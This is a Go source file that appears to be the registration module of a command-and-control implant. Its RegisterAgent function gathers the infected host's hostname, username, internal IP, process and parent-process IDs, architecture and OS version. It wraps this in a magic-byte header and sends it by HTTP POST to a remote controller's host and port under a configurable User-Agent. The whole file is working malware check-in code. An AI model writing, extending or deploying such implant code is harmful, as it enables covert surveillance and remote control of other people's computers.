package register

import (
	"bytes"
	hg "dingo/hellsgopher"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func RegisterAgent(sleep int, rhost string, rport string, useragent string, uri string, agentID int, magic []byte) {
	newDataJSON := createRegisterJson(sleep, agentID, rhost, rport)

	newRegisterJSON := registerJSON{
		Task: "register",
		Data: newDataJSON,
	}

	requestJSON, _ := json.Marshal(newRegisterJSON)

	var requestSize int = len(requestJSON) + 12
	buffer := new(bytes.Buffer)
	binary.Write(buffer, binary.BigEndian, requestSize)
	bRequestSize := fmt.Sprint(buffer)

	agentHeader := bRequestSize + fmt.Sprint(string(magic[:])) + fmt.Sprint(agentID)

	url := rhost + ":" + rport + "/" + uri

	sendRegisterRequest(requestJSON, agentHeader, useragent, url)
}

func createRegisterJson(sleep int, agentID int, rhost string, rport string) dataJSON {
	newDataJSON := dataJSON{
		AgentID:         agentID,
		Hostname:        hg.GetHostname(),
		Username:        hg.GetUsername(),
		Domain:          "",
		InternalIP:      hg.GetInternalIP(rhost, rport),
		ProcessPath:     hg.GetProcessPath(),
		ProcessID:       hg.GetProcessID(),
		ParentProcessID: hg.GetParentProcessID(),
		ProcessArch:     hg.GetProcessArch(),
		ProcessElevated: 0,
		OSBuild:         hg.GetOSBuild(),
		OSVersion:       hg.GetOSVersion(),
		OSARCH:          hg.GetProcessArch(),
		Sleep:           sleep,
	}

	return newDataJSON
}

func sendRegisterRequest(registerRequest []byte, agentHeader string, useragent string, url string) {
	data := append([]byte(agentHeader)[:], registerRequest[:]...)

	client := http.Client{}
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Add("User-Agent", useragent)

	resp, _ := client.Do(req)

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println(string(body))
}
